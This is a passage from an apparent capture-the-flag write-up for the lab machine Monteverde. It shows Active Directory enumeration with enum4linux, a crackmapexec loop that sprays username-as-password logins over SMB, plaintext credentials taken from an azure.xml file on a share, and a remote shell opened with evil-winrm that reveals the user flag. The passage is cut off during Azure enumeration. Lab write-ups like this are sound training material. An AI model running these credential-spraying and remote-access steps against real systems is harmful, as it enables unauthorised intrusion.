&lt;span class="code-line"&gt;  Sharename       Type      Comment&lt;/span&gt;
&lt;span class="code-line"&gt;  ---------       ----      -------&lt;/span&gt;
&lt;span class="code-line"&gt;SMB1 disabled -- no workgroup available&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Attempting to map shares on 10.10.10.172&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;====================================================&lt;/span&gt;
&lt;span class="code-line"&gt;|    Password Policy Information for 10.10.10.172    |&lt;/span&gt;
&lt;span class="code-line"&gt;====================================================&lt;/span&gt;
&lt;span class="code-line"&gt;[E] Dependent program &amp;quot;polenum.py&amp;quot; not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;==============================&lt;/span&gt;
&lt;span class="code-line"&gt;|    Groups on 10.10.10.172    |&lt;/span&gt;
&lt;span class="code-line"&gt;==============================&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 542.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Getting builtin groups:&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Incoming Forest Trust Builders] rid:[0x22d]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Windows Authorization Access Group] rid:[0x230]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Terminal Server License Servers] rid:[0x231]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Users] rid:[0x221]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Guests] rid:[0x222]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Remote Desktop Users] rid:[0x22b]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Network Configuration Operators] rid:[0x22c]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Performance Monitor Users] rid:[0x22e]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Performance Log Users] rid:[0x22f]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Distributed COM Users] rid:[0x232]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[IIS_IUSRS] rid:[0x238]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Cryptographic Operators] rid:[0x239]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Event Log Readers] rid:[0x23d]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Certificate Service DCOM Access] rid:[0x23e]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[RDS Remote Access Servers] rid:[0x23f]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[RDS Endpoint Servers] rid:[0x240]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[RDS Management Servers] rid:[0x241]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Hyper-V Administrators] rid:[0x242]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Access Control Assistance Operators] rid:[0x243]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Remote Management Users] rid:[0x244]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Storage Replica Administrators] rid:[0x246]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Getting builtin group memberships:&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;IIS_IUSRS&amp;#39; (RID: 568) has member: Couldn&amp;#39;t lookup SIDs&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Windows Authorization Access Group&amp;#39; (RID: 560) has member: Couldn&amp;#39;t lookup SIDs&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Pre-Windows 2000 Compatible Access&amp;#39; (RID: 554) has member: Couldn&amp;#39;t lookup SIDs&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Guests&amp;#39; (RID: 546) has member: Couldn&amp;#39;t lookup SIDs&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Remote Management Users&amp;#39; (RID: 580) has member: Couldn&amp;#39;t lookup SIDs&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Users&amp;#39; (RID: 545) has member: Couldn&amp;#39;t lookup SIDs&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 542.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Getting local groups:&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Cert Publishers] rid:[0x205]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[RAS and IAS Servers] rid:[0x229]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Allowed RODC Password Replication Group] rid:[0x23b]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Denied RODC Password Replication Group] rid:[0x23c]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[DnsAdmins] rid:[0x44d]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[ADSyncAdmins] rid:[0x451]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[ADSyncOperators] rid:[0x452]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[ADSyncBrowse] rid:[0x453]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[ADSyncPasswordSet] rid:[0x454]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Getting local group memberships:&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;ADSyncAdmins&amp;#39; (RID: 1105) has member: Couldn&amp;#39;t lookup SIDs&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Denied RODC Password Replication Group&amp;#39; (RID: 572) has member: Couldn&amp;#39;t lookup SIDs&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 593.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Getting domain groups:&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Domain Users] rid:[0x201]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Domain Guests] rid:[0x202]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Domain Computers] rid:[0x203]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Group Policy Creator Owners] rid:[0x208]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Cloneable Domain Controllers] rid:[0x20a]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Protected Users] rid:[0x20d]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[DnsUpdateProxy] rid:[0x44e]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Azure Admins] rid:[0xa29]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[File Server Admins] rid:[0xa2e]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Call Recording Admins] rid:[0xa2f]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Reception] rid:[0xa30]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Operations] rid:[0xa31]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Trading] rid:[0xa32]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[HelpDesk] rid:[0xa33]&lt;/span&gt;
&lt;span class="code-line"&gt;group:[Developers] rid:[0xa34]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Getting domain group memberships:&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Domain Users&amp;#39; (RID: 513) has member: MEGABANK\Administrator&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Domain Users&amp;#39; (RID: 513) has member: MEGABANK\krbtgt&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Domain Users&amp;#39; (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Domain Users&amp;#39; (RID: 513) has member: MEGABANK\mhope&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Domain Users&amp;#39; (RID: 513) has member: MEGABANK\SABatchJobs&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Domain Users&amp;#39; (RID: 513) has member: MEGABANK\svc-ata&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Domain Users&amp;#39; (RID: 513) has member: MEGABANK\svc-bexec&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Domain Users&amp;#39; (RID: 513) has member: MEGABANK\svc-netapp&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Domain Users&amp;#39; (RID: 513) has member: MEGABANK\dgalanos&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Domain Users&amp;#39; (RID: 513) has member: MEGABANK\roleary&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Domain Users&amp;#39; (RID: 513) has member: MEGABANK\smorgan&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Operations&amp;#39; (RID: 2609) has member: MEGABANK\smorgan&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Trading&amp;#39; (RID: 2610) has member: MEGABANK\dgalanos&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Domain Guests&amp;#39; (RID: 514) has member: MEGABANK\Guest&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Group Policy Creator Owners&amp;#39; (RID: 520) has member: MEGABANK\Administrator&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Azure Admins&amp;#39; (RID: 2601) has member: MEGABANK\Administrator&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Azure Admins&amp;#39; (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;Azure Admins&amp;#39; (RID: 2601) has member: MEGABANK\mhope&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.&lt;/span&gt;
&lt;span class="code-line"&gt;Group &amp;#39;HelpDesk&amp;#39; (RID: 2611) has member: MEGABANK\roleary&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;=======================================================================&lt;/span&gt;
&lt;span class="code-line"&gt;|    Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050)    |&lt;/span&gt;
&lt;span class="code-line"&gt;=======================================================================&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 710.&lt;/span&gt;
&lt;span class="code-line"&gt;[E] Couldn&amp;#39;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 742.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;=============================================&lt;/span&gt;
&lt;span class="code-line"&gt;|    Getting printer info for 10.10.10.172    |&lt;/span&gt;
&lt;span class="code-line"&gt;=============================================&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 995.&lt;/span&gt;
&lt;span class="code-line"&gt;Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;enum4linux complete on Sun Jan 12 09:15:49 2020&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="testing-creds"&gt;Testing creds&lt;/h2&gt;
&lt;p&gt;We put the usernames in a file &lt;code&gt;users&lt;/code&gt; and we test every account for password
equal username on the SMB service.&lt;/p&gt;
&lt;p&gt;The account &lt;code&gt;SABatchJobs:SABatchJobs&lt;/code&gt; seems to be a valide account.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# while read l; do crackmapexec smb 10.10.10.172 -u $l -p $l --shares; done &amp;lt; users&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\Guest:Guest STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;[*] KTHXBYE!&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;[*] KTHXBYE!&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\mhope:mhope STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;[*] KTHXBYE!&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [+] MEGABANK\SABatchJobs:SABatchJobs&lt;/span&gt;
&lt;span class="code-line"&gt;[*] KTHXBYE!&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\svc-ata:svc-ata STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;[*] KTHXBYE!&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\svc-bexec:svc-bexec STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;[*] KTHXBYE!&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\svc-netapp:svc-netapp STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;[*] KTHXBYE!&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\dgalanos:dgalanos STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;[*] KTHXBYE!&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\roleary:roleary STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;[*] KTHXBYE!&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\smorgan:smorgan STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;[*] KTHXBYE!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="smb-as-sabatchjobs"&gt;SMB as SABatchJobs&lt;/h2&gt;
&lt;p&gt;We connect to the &lt;code&gt;Users$&lt;/code&gt; share with our SABatchJobs account. The first user
folder is empty and the second one give us an other account: mhope.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# smbclient //10.10.10.172/Users$ -U &amp;quot;SABatchJobs&amp;quot;%&amp;quot;SABatchJobs&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Try &amp;quot;help&amp;quot; to get a list of possible commands.&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \&amp;gt; dir&lt;/span&gt;
&lt;span class="code-line"&gt;  .                                   D        0  Fri Jan  3 08:12:48 2020&lt;/span&gt;
&lt;span class="code-line"&gt;  ..                                  D        0  Fri Jan  3 08:12:48 2020&lt;/span&gt;
&lt;span class="code-line"&gt;  dgalanos                            D        0  Fri Jan  3 08:12:30 2020&lt;/span&gt;
&lt;span class="code-line"&gt;  mhope                               D        0  Fri Jan  3 08:41:18 2020&lt;/span&gt;
&lt;span class="code-line"&gt;  roleary                             D        0  Fri Jan  3 08:10:30 2020&lt;/span&gt;
&lt;span class="code-line"&gt;  smorgan                             D        0  Fri Jan  3 08:10:24 2020&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    524031 blocks of size 4096. 518419 blocks available&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \&amp;gt; cd mhope\&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \mhope\&amp;gt; ls&lt;/span&gt;
&lt;span class="code-line"&gt;  .                                   D        0  Fri Jan  3 08:41:18 2020&lt;/span&gt;
&lt;span class="code-line"&gt;  ..                                  D        0  Fri Jan  3 08:41:18 2020&lt;/span&gt;
&lt;span class="code-line"&gt;  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    524031 blocks of size 4096. 518419 blocks available&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \mhope\&amp;gt; mget azure.xml&lt;/span&gt;
&lt;span class="code-line"&gt;Get file azure.xml? y&lt;/span&gt;
&lt;span class="code-line"&gt;getting file \mhope\azure.xml of size 1212 as azure.xml (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;��&amp;lt;Objs Version=&amp;quot;1.1.0.1&amp;quot; xmlns=&amp;quot;http://schemas.microsoft.com/powershell/2004/04&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;Obj RefId=&amp;quot;0&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;TN RefId=&amp;quot;0&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;T&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/T&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;/TN&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;ToString&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/ToString&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;Props&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;DT N=&amp;quot;StartDate&amp;quot;&amp;gt;2020-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;DT N=&amp;quot;EndDate&amp;quot;&amp;gt;2054-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;G N=&amp;quot;KeyId&amp;quot;&amp;gt;00000000-0000-0000-0000-000000000000&amp;lt;/G&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;S N=&amp;quot;Password&amp;quot;&amp;gt;4n0therD4y@n0th3r$&amp;lt;/S&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;/Props&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;/Obj&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/Objs&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="evil-winrm"&gt;evil-winrm&lt;/h2&gt;
&lt;p&gt;We use &lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt; to connect to the
box with our new account. We quickly find the user's flag on the Desktop.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# ruby evil-winrm.rb -u mhope -i 10.10.10.172 -p &amp;#39;4n0therD4y@n0th3r$&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\mhope\Documents&amp;gt; cat ../Desktop/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;4961976bd7d8f4eeb2ce3705e2f212f2&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
&lt;h2 id="azure"&gt;Azure&lt;/h2&gt;
&lt;p&gt;While enumerating more we found some &lt;code&gt;.Azure&lt;/code&gt; file containg a few information
about the Azure configuration&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\mhope\.Azure&amp;gt; ls&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
